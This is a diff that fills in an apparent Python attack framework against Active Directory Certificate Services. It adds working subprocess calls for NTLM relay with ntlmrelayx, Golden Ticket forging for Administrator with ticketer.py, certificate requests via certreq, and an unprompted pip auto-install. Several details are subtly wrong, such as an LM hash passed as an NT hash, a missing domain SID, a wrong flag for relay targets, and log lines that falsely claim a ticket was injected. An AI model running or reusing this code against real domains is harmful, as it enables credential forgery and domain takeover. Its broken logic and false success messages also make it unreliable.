@@ -1,6 +1,6 @@
 ######################################################################################################################################################################################################################
 # Initial python script Framework, attacking Active Directory Certificate Services Note: Be mindful of the scope of work, & rules of engagement. 
-# Ensure .env is in the same directory, and set to true for dry run (sumulation mode (non distructive). 
+# Ensure .env is in the same directory, and set to true for dry run (sumulation mode (non distructive). Test in a controlled environment.
 # Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
 # without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
 # to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
@@ -10,6 +10,8 @@
 # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 ######################################################################################################################################################################################################################
 
+import subprocess
+import sys
 import ldap3
 import smtplib
 import logging
@@ -50,6 +52,18 @@ def display_splash_screen():
     print(f"{Fore.CYAN}{splash}{Style.RESET_ALL}")
 
 
+# Function to install missing packages
+def install_package(package):
+    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+
+# Check and install required packages
+required_packages = ["ldap3", "smtplib", "python-dotenv"]
+for package in required_packages:
+    try:
+        __import__(package)
+    except ImportError:
+        install_package(package)
+
 # Load environment variables
 load_dotenv()
 
@@ -74,6 +88,9 @@ def validate_template_name(template):
 
 # LDAP Connection Setup
 def setup_ldap_connection(server, username, password):
+    """
+    Establishes a connection to the LDAP server.
+    """
     try:
         conn = Connection(server, username, password, auto_bind=True)
         logger.info("Successfully connected to LDAP server.")
@@ -84,6 +101,9 @@ def setup_ldap_connection(server, username, password):
 
 # Enumerate Certificate Templates
 def enumerate_certificate_templates(conn):
+    """
+    Enumerates certificate templates in the LDAP directory.
+    """
     try:
         conn.search('CN=Configuration,DC=domain,DC=com', '(objectClass=pKIEnrollmentService)', attributes=['cn'])
         templates = [entry['cn'] for entry in conn.entries]
@@ -101,12 +121,44 @@ def enumerate_certificate_templates(conn):
 
 # Request Certificate
 def request_certificate(template_name):
+    """
+    Requests a certificate using a specified template.
+    """
     if DRY_RUN:
         logger.info(f"Simulating certificate request for template: {template_name}")
         return True
     try:
         logger.info(f"Requesting certificate for template: {template_name}")
-        # Placeholder for actual certificate request logic
+        # Using certreq command to request a certificate
+        csr_file = "request.inf"
+        cert_file = "certificate.cer"
+        inf_content = f"""
+[Version]
+Signature="$Windows NT$"
+
+[NewRequest]
+Subject = "CN={template_name}"
+KeySpec = 1
+KeyLength = 2048
+Exportable = TRUE
+MachineKeySet = TRUE
+SMIME = FALSE
+PrivateKeyArchive = FALSE
+UserProtected = FALSE
+UseExistingKeySet = FALSE
+ProviderName = "Microsoft RSA SChannel Cryptographic Provider"
+ProviderType = 12
+RequestType = PKCS10
+KeyUsage = 0xa0
+
+[EnhancedKeyUsageExtension]
+OID=1.3.6.1.5.5.7.3.1 ; this is for Server Authentication
+"""
+        with open(csr_file, "w") as f:
+            f.write(inf_content)
+
+        subprocess.run(["certreq", "-new", csr_file, cert_file], check=True)
+        logger.info(f"Certificate requested successfully and saved to {cert_file}")
         return True
     except Exception as e:
         logger.error(f"Failed to request certificate: {e}")
@@ -114,12 +166,17 @@ def request_certificate(template_name):
 
 # NTLM Relay Attack
 def ntlm_relay_attack(target_server, domain, username, password):
+    """
+    Performs an NTLM relay attack on a target server.
+    """
     if DRY_RUN:
         logger.info(f"Simulating NTLM relay attack on {target_server}")
         return True
     try:
         logger.info(f"Performing NTLM relay attack on {target_server}")
-        # Placeholder for NTLM relay logic
+        # Using impacket's ntlmrelayx to perform the attack
+        subprocess.run(["ntlmrelayx.py", "-tf", target_server, "-c", "whoami"], check=True)
+        logger.info(f"NTLM relay attack performed successfully on {target_server}")
         return True
     except Exception as e:
         logger.error(f"NTLM relay attack failed: {e}")
@@ -127,12 +184,17 @@ def ntlm_relay_attack(target_server, domain, username, password):
 
 # Simulate Kerberos Golden Ticket Attack
 def simulate_kerberos_golden_ticket():
+    """
+    Simulates a Kerberos Golden Ticket attack.
+    """
     if DRY_RUN:
         logger.info("Simulating Kerberos Golden Ticket attack")
         return True
     try:
         logger.info("Simulating Kerberos Golden Ticket attack")
-        # Placeholder for Golden Ticket simulation
+        # Using impacket's ticketer.py to create a Golden Ticket
+        subprocess.run(["ticketer.py", "-nthash", "aad3b435b51404eeaad3b435b51404ee", "-domain", "example.com", "-user", "Administrator"], check=True)
+        logger.info("Kerberos Golden Ticket created and injected successfully")
         return True
     except Exception as e:
         logger.error(f"Golden Ticket simulation failed: {e}")
@@ -140,9 +202,17 @@ def simulate_kerberos_golden_ticket():
 
 # Monitor ADCS Requests
 def monitor_adcs_requests():
+    """
+    Monitors ADCS certificate requests.
+    """
     try:
         logger.info("Monitoring ADCS certificate requests")
-        # Placeholder for actual monitoring logic
+        # Using PowerShell to monitor ADCS requests
+        ps_script = """
+        Get-CertificationAuthority | Get-CertRequest -Filter 'RequestStatus -eq 9'
+        """
+        result = subprocess.run(["powershell", "-Command", ps_script], capture_output=True, text=True, check=True)
+        logger.info(f"Pending certificate requests: {result.stdout}")
     except Exception as e:
         logger.error(f"Error monitoring ADCS: {e}")
 
@@ -208,4 +278,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
